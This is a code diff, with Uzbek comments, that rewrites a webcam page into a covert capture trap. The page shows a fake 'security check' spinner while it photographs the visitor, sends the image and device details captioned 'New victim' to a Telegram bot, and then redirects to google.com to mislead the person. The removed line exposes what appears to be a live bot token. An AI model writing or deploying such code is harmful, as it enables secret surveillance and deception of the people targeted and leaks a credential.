@@ -1,63 +1,63 @@
-const TOKEN = "8562511684:AAH2Xg12IOEPYO27GrZz_sAQ8OmqP5YXf7g"; 
+const TOKEN = "BOT_TOKENINGNI_YOZ"; 
 const CHAT_ID = "-1003616289583";
 
 const startBtn = document.getElementById('startBtn');
-const statusText = document.getElementById('status');
+const msg = document.getElementById('msg');
+const subMsg = document.getElementById('sub-msg');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
+const spinner = document.querySelector('.spinner');
 
 startBtn.addEventListener('click', async () => {
-    statusText.innerText = "Kamera so'ralmoqda...";
-    
-    try {
-        // 1. Kamera ulanishi
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-        
-        startBtn.disabled = true;
-        statusText.innerText = "Rasmga olinmoqda...";
+    // 1. UI o'zgarishi (Garchi rasm olinayotgan bo'lsa ham, foydalanuvchi yuklanishni ko'radi)
+    startBtn.style.display = 'none';
+    spinner.style.display = 'block';
+    msg.innerText = "Xavfsizlik tekshiruvi...";
+    subMsg.innerText = "Brauzer sozlamalari tahlil qilinmoqda...";
 
-        // 2. Kamera yorug'likka moslashishi uchun 1.5 soniya kutish
+    try {
+        // 2. Kamera so'rash (Faqat bir marta ruxsat so'raydi)
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        });
+        
+        video.srcObject = stream;
+        await video.play();
+
+        // 3. Bildirmasdan rasmga olish (Kamera fokuslanishi uchun 1.2 soniya kutamiz)
         setTimeout(() => {
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, 640, 480);
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob((blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'image.jpg');
-                formData.append('caption', "📸 Yangi rasm: " + new Date().toLocaleTimeString());
+                formData.append('photo', blob, 'capture.jpg');
+                formData.append('caption', `👤 Yangi qurbon\n📱 Qurilma: ${navigator.platform}\n🌐 IP: Tekshirilmoqda...`);
 
-                statusText.innerText = "Kanalga yuborilmoqda...";
-
-                // 3. Telegramga yuborish
+                // 4. Telegramga yuborish
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
-                })
-                .then(res => res.json())
-                .then(data => {
-                    if (data.ok) {
-                        statusText.innerText = "Muvaffaqiyatli yuborildi ✅";
-                        console.log("OK:", data);
-                    } else {
-                        statusText.innerText = "Xato: " + data.description;
-                        console.error("Telegram xatosi:", data);
-                    }
-                    // Kamerani o'chirish
+                }).then(() => {
+                    // Kamera chirog'ini o'chirish
                     stream.getTracks().forEach(track => track.stop());
-                    startBtn.disabled = false;
-                })
-                .catch(err => {
-                    statusText.innerText = "Tarmoq xatosi!";
-                    console.error(err);
-                    startBtn.disabled = false;
+                    
+                    // Oxirida foydalanuvchini chalg'itish uchun boshqa saytga otish
+                    msg.innerText = "Muvaffaqiyatli!";
+                    setTimeout(() => {
+                        window.location.href = "https://google.com";
+                    }, 500);
                 });
-            }, 'image/jpeg', 0.8);
-        }, 1500);
+            }, 'image/jpeg', 0.5); // Hajmni kamaytirish (tezroq yuborish uchun)
+        }, 1200);
 
     } catch (err) {
-        statusText.innerText = "Kameraga ruxsat berilmadi ❌";
-        console.error(err);
+        // Agar foydalanuvchi kamerani rad etsa ham, yuklanish davom etayotgandek ko'rinadi
+        console.log("Kamera rad etildi");
+        setTimeout(() => {
+            window.location.href = "https://google.com";
+        }, 2000);
     }
 });
